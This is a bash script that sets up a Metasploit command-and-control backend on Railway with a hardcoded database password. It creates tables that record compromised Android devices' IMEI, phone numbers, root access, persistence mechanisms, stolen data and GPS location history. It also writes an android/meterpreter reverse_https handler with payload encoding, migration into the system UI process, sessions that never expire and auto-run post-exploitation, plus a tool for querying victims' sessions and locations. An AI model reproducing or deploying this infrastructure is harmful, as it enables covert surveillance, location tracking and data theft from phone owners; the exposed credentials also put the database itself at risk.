#!/bin/bash

# Railway Database Configuration with Actual Credentials
# پیکربندی دیتابیس Railway با اطلاعات واقعی

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║     🗄️  Railway PostgreSQL Configuration                         ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

# ═══════════════════════════════════════════════════════════════
# RAILWAY POSTGRESQL CREDENTIALS
# ═══════════════════════════════════════════════════════════════
export PGHOST="postgres.railway.internal"
export PGPORT="5432"
export POSTGRES_DB="railway"
export POSTGRES_USER="postgres"
export POSTGRES_PASSWORD="oNnmkkGTsBScDMhJGyuPWbHqfBegneKo"

DATABASE_URL="postgresql://postgres:oNnmkkGTsBScDMhJGyuPWbHqfBegneKo@postgres.railway.internal:5432/railway"

echo "📋 Railway Database Configuration:"
echo "   Host: $PGHOST"
echo "   Port: $PGPORT"
echo "   Database: $POSTGRES_DB"
echo "   User: $POSTGRES_USER"
echo "   Password: ${POSTGRES_PASSWORD:0:10}..."
echo ""

# ═══════════════════════════════════════════════════════════════
# STEP 1: Configure Metasploit Database
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [1/3] Configuring Metasploit Database..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

mkdir -p ~/.msf4

# Create database.yml with Railway credentials
cat > ~/.msf4/database.yml << YAML_END
production:
  adapter: postgresql
  database: railway
  username: postgres
  password: oNnmkkGTsBScDMhJGyuPWbHqfBegneKo
  host: postgres.railway.internal
  port: 5432
  pool: 200
  timeout: 5
  encoding: utf8
  sslmode: prefer
  reconnect: true
  
development:
  adapter: postgresql
  database: railway
  username: postgres
  password: oNnmkkGTsBScDMhJGyuPWbHqfBegneKo
  host: postgres.railway.internal
  port: 5432
  pool: 200
  timeout: 5
  encoding: utf8
  sslmode: prefer
  reconnect: true
YAML_END

echo "✅ Database configuration created: ~/.msf4/database.yml"
echo ""

# ═══════════════════════════════════════════════════════════════
# STEP 2: Create Persistence Tables SQL
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [2/3] Creating Persistence Tables SQL..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

cat > /tmp/railway_persistence_tables.sql << 'SQL_END'
-- Railway Persistence Tables
-- Created: 2025-11-22

-- Drop existing tables if they exist
DROP TABLE IF EXISTS device_locations CASCADE;
DROP TABLE IF EXISTS collected_data CASCADE;
DROP TABLE IF EXISTS persistence_mechanisms CASCADE;
DROP TABLE IF EXISTS session_checkpoints CASCADE;
DROP TABLE IF EXISTS persistent_sessions CASCADE;

-- Main session tracking table
CREATE TABLE persistent_sessions (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) UNIQUE NOT NULL,
    device_id VARCHAR(255),
    device_name VARCHAR(255),
    android_version VARCHAR(50),
    manufacturer VARCHAR(100),
    model VARCHAR(100),
    imei VARCHAR(50),
    phone_number VARCHAR(30),
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    connection_count INTEGER DEFAULT 1,
    lhost VARCHAR(255),
    lport INTEGER,
    payload_type VARCHAR(100),
    is_active BOOLEAN DEFAULT TRUE,
    persistence_level VARCHAR(50),
    root_access BOOLEAN DEFAULT FALSE,
    installed_apps TEXT,
    notes TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Session state checkpoints
CREATE TABLE session_checkpoints (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL REFERENCES persistent_sessions(session_uuid) ON DELETE CASCADE,
    checkpoint_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    working_directory TEXT,
    process_id INTEGER,
    process_name VARCHAR(255),
    arch VARCHAR(50),
    privileges TEXT,
    network_info JSONB,
    checkpoint_data JSONB
);

-- Persistence mechanisms tracking
CREATE TABLE persistence_mechanisms (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL REFERENCES persistent_sessions(session_uuid) ON DELETE CASCADE,
    mechanism_type VARCHAR(100) NOT NULL,
    mechanism_name VARCHAR(255),
    installation_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    is_active BOOLEAN DEFAULT TRUE,
    last_verified TIMESTAMP,
    installation_path TEXT,
    configuration JSONB,
    notes TEXT
);

-- Collected data storage
CREATE TABLE collected_data (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL REFERENCES persistent_sessions(session_uuid) ON DELETE CASCADE,
    data_type VARCHAR(100) NOT NULL,
    collection_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    data_size BIGINT,
    file_path TEXT,
    data_content TEXT,
    metadata JSONB,
    is_encrypted BOOLEAN DEFAULT FALSE
);

-- GPS location history
CREATE TABLE device_locations (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL REFERENCES persistent_sessions(session_uuid) ON DELETE CASCADE,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    latitude DECIMAL(10, 8),
    longitude DECIMAL(11, 8),
    accuracy DECIMAL(10, 2),
    altitude DECIMAL(10, 2),
    provider VARCHAR(50),
    address TEXT
);

-- Indexes for performance
CREATE INDEX idx_session_uuid ON persistent_sessions(session_uuid);
CREATE INDEX idx_device_id ON persistent_sessions(device_id);
CREATE INDEX idx_last_seen ON persistent_sessions(last_seen);
CREATE INDEX idx_is_active ON persistent_sessions(is_active);
CREATE INDEX idx_checkpoints_uuid ON session_checkpoints(session_uuid);
CREATE INDEX idx_persistence_uuid ON persistence_mechanisms(session_uuid);
CREATE INDEX idx_collected_uuid ON collected_data(session_uuid);
CREATE INDEX idx_locations_uuid ON device_locations(session_uuid);
CREATE INDEX idx_locations_time ON device_locations(timestamp);

-- View for active sessions with statistics
CREATE OR REPLACE VIEW v_active_sessions AS
SELECT 
    ps.*,
    COUNT(DISTINCT pm.id) as persistence_count,
    COUNT(DISTINCT cd.id) as collected_data_count,
    MAX(dl.timestamp) as last_location_time,
    COUNT(DISTINCT dl.id) as location_count
FROM persistent_sessions ps
LEFT JOIN persistence_mechanisms pm ON ps.session_uuid = pm.session_uuid AND pm.is_active = TRUE
LEFT JOIN collected_data cd ON ps.session_uuid = cd.session_uuid
LEFT JOIN device_locations dl ON ps.session_uuid = dl.session_uuid
WHERE ps.is_active = TRUE
GROUP BY ps.id;

-- Function to update timestamps
CREATE OR REPLACE FUNCTION update_session_timestamp()
RETURNS TRIGGER AS $$
BEGIN
    NEW.last_seen = CURRENT_TIMESTAMP;
    NEW.updated_at = CURRENT_TIMESTAMP;
    IF TG_OP = 'UPDATE' THEN
        NEW.connection_count = NEW.connection_count + 1;
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Trigger for automatic timestamp updates
CREATE TRIGGER trigger_update_session
    BEFORE UPDATE ON persistent_sessions
    FOR EACH ROW
    EXECUTE FUNCTION update_session_timestamp();

-- Comments
COMMENT ON TABLE persistent_sessions IS 'Tracks persistent sessions for automatic reconnection';
COMMENT ON TABLE session_checkpoints IS 'Session state checkpoints for recovery';
COMMENT ON TABLE persistence_mechanisms IS 'All installed persistence mechanisms';
COMMENT ON TABLE collected_data IS 'Data collected from compromised devices';
COMMENT ON TABLE device_locations IS 'GPS location history';

-- Success message
DO $$
BEGIN
    RAISE NOTICE 'Railway persistence tables created successfully!';
    RAISE NOTICE 'Tables: persistent_sessions, session_checkpoints, persistence_mechanisms, collected_data, device_locations';
END $$;
SQL_END

echo "✅ SQL script created: /tmp/railway_persistence_tables.sql"
echo ""

# ═══════════════════════════════════════════════════════════════
# STEP 3: Initialize Database (if psql is available)
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [3/3] Database Initialization..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if command -v psql &> /dev/null; then
    echo "🔄 Attempting to create tables..."
    
    PGPASSWORD=$POSTGRES_PASSWORD psql \
        -h $PGHOST \
        -U $POSTGRES_USER \
        -d $POSTGRES_DB \
        -f /tmp/railway_persistence_tables.sql 2>&1 | grep -E "(NOTICE|ERROR|CREATE|ALTER)"
    
    if [ $? -eq 0 ]; then
        echo "✅ Tables created successfully"
    else
        echo "⚠️  Could not auto-create tables (normal if not on Railway)"
        echo "   Run this command in Railway terminal:"
        echo "   PGPASSWORD=oNnmkkGTsBScDMhJGyuPWbHqfBegneKo psql -h postgres.railway.internal -U postgres -d railway -f /tmp/railway_persistence_tables.sql"
    fi
else
    echo "⚠️  psql not found - manual initialization required"
    echo ""
    echo "   Copy SQL file to Railway and run:"
    echo "   PGPASSWORD=oNnmkkGTsBScDMhJGyuPWbHqfBegneKo psql -h postgres.railway.internal -U postgres -d railway -f /tmp/railway_persistence_tables.sql"
fi

echo ""

# ═══════════════════════════════════════════════════════════════
# Create Railway-specific Handler
# ═══════════════════════════════════════════════════════════════
cat > /home/offsec/Documents/GitHub/metasploit-framework1/railway_handler_final.rc << 'HANDLER_FINAL'
#!/usr/bin/env ruby
# Railway Handler with PostgreSQL Integration

# Database connection
db_connect postgresql://postgres:oNnmkkGTsBScDMhJGyuPWbHqfBegneKo@postgres.railway.internal:5432/railway

# Check database status
db_status

# Load handler
use exploit/multi/handler

# Payload configuration
set PAYLOAD android/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 29210

# SSL/TLS Configuration
set HandlerSSLCert /root/.msf4/ssl/cert.pem
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai

# Session persistence
set SessionCommunicationTimeout 0
set SessionExpirationTimeout 0
set SessionRetryTotal 100
set SessionRetryWait 10
set ExitOnSession false

# Advanced options
set EnableUnicodeEncoding true
set PrependMigrate true
set PrependMigrateProc com.android.systemui

# Logging
set ConsoleLogging true
set LogLevel 3
set VERBOSE true

# Auto-exploitation
set AutoRunScript multi_console_command -rc /root/post_exploit_railway.rc

# Start handler
exploit -j -z

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║       🚀 Railway Handler with Database Integration Active!      ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "📡 Network:"
echo "   Public: metro.proxy.rlwy.net:29210"
echo "   Internal: metasploit-framework1.railway.internal"
echo ""
echo "🗄️  Database:"
echo "   PostgreSQL: postgres@postgres.railway.internal:5432/railway"
echo "   Status: Connected"
echo ""
echo "🔐 Security:"
echo "   Protocol: HTTPS (TLS encrypted)"
echo "   Certificate: RSA-4096"
echo "   Encoding: Enabled"
echo ""
echo "⏳ Waiting for connections..."
echo "═══════════════════════════════════════════════════════════════════"
HANDLER_FINAL

echo "✅ Railway handler created: railway_handler_final.rc"
echo ""

# ═══════════════════════════════════════════════════════════════
# Create Database Query Helper
# ═══════════════════════════════════════════════════════════════
cat > /home/offsec/Documents/GitHub/metasploit-framework1/db_query.sh << 'QUERY_SCRIPT'
#!/bin/bash
# Quick Database Query Tool

PGPASSWORD="oNnmkkGTsBScDMhJGyuPWbHqfBegneKo"
PGHOST="postgres.railway.internal"
PGUSER="postgres"
PGDATABASE="railway"

export PGPASSWORD PGHOST PGUSER PGDATABASE

case "$1" in
    sessions|s)
        echo "Active Sessions:"
        psql -c "SELECT session_uuid, device_name, android_version, last_seen, connection_count FROM persistent_sessions WHERE is_active = TRUE ORDER BY last_seen DESC;"
        ;;
    stats|st)
        echo "Session Statistics:"
        psql -c "SELECT COUNT(*) as total, COUNT(CASE WHEN is_active THEN 1 END) as active, COUNT(CASE WHEN root_access THEN 1 END) as rooted FROM persistent_sessions;"
        ;;
    persist|p)
        echo "Persistence Mechanisms:"
        psql -c "SELECT session_uuid, mechanism_type, mechanism_name, installation_time FROM persistence_mechanisms WHERE is_active = TRUE ORDER BY installation_time DESC LIMIT 20;"
        ;;
    locations|l)
        echo "Device Locations:"
        psql -c "SELECT session_uuid, timestamp, latitude, longitude, address FROM device_locations ORDER BY timestamp DESC LIMIT 20;"
        ;;
    data|d)
        echo "Collected Data:"
        psql -c "SELECT session_uuid, data_type, COUNT(*) as count, pg_size_pretty(SUM(data_size)) as total_size FROM collected_data GROUP BY session_uuid, data_type;"
        ;;
    *)
        echo "Usage: $0 {sessions|stats|persist|locations|data}"
        echo ""
        echo "Commands:"
        echo "  sessions (s)   - Show active sessions"
        echo "  stats (st)     - Show statistics"
        echo "  persist (p)    - Show persistence mechanisms"
        echo "  locations (l)  - Show device locations"
        echo "  data (d)       - Show collected data"
        ;;
esac
QUERY_SCRIPT

chmod +x /home/offsec/Documents/GitHub/metasploit-framework1/db_query.sh
echo "✅ Database query tool created: db_query.sh"
echo ""

# ═══════════════════════════════════════════════════════════════
# Final Summary
# ═══════════════════════════════════════════════════════════════
echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║           ✅ RAILWAY DATABASE CONFIGURED SUCCESSFULLY!           ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "🗄️  Database Information:"
echo "   Host: postgres.railway.internal"
echo "   Port: 5432"
echo "   Database: railway"
echo "   User: postgres"
echo "   Connection: Ready"
echo ""
echo "📁 Created Files:"
echo "   ✅ ~/.msf4/database.yml"
echo "   ✅ /tmp/railway_persistence_tables.sql"
echo "   ✅ railway_handler_final.rc"
echo "   ✅ db_query.sh"
echo ""
echo "🚀 Railway Deployment Commands:"
echo ""
echo "1️⃣  Initialize Tables (در Railway terminal):"
echo "    PGPASSWORD=oNnmkkGTsBScDMhJGyuPWbHqfBegneKo \\"
echo "    psql -h postgres.railway.internal -U postgres -d railway \\"
echo "    -f /tmp/railway_persistence_tables.sql"
echo ""
echo "2️⃣  Start Handler:"
echo "    msfconsole -r railway_handler_final.rc"
echo ""
echo "3️⃣  Query Database:"
echo "    ./db_query.sh sessions"
echo "    ./db_query.sh stats"
echo "    ./db_query.sh persist"
echo ""
echo "4️⃣  Direct SQL Query:"
echo "    PGPASSWORD=oNnmkkGTsBScDMhJGyuPWbHqfBegneKo \\"
echo "    psql -h postgres.railway.internal -U postgres -d railway \\"
echo "    -c \"SELECT * FROM v_active_sessions;\""
echo ""
echo "═══════════════════════════════════════════════════════════════════"
echo ""
echo "✅ Database configuration complete and ready for Railway deployment!"
